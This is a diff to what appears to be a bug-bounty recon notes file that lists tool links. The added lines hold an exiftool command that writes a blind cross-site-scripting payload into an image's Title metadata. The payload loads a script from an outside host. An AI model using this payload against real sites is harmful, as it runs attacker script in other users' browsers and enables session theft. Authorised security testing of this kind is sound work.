@@ -10,6 +10,10 @@ Hook: https://webhook.site/
 https://github.com/dirtycoder0124/form_finder/tree/main
 https://github.com/yogsec/endpoints-extractor/tree/main
 
+Inject Payload:
+---------------
+exiftool -Title="'\"><script src=https://xss0r.com/c/lostsec></script>" lostsec.jpg
+
 $ nuclei -auth
 https://github.com/reewardius/Nuclei-AI-Prompts
 https://nucleiprompts.com/prompt.php?vuln_id=1
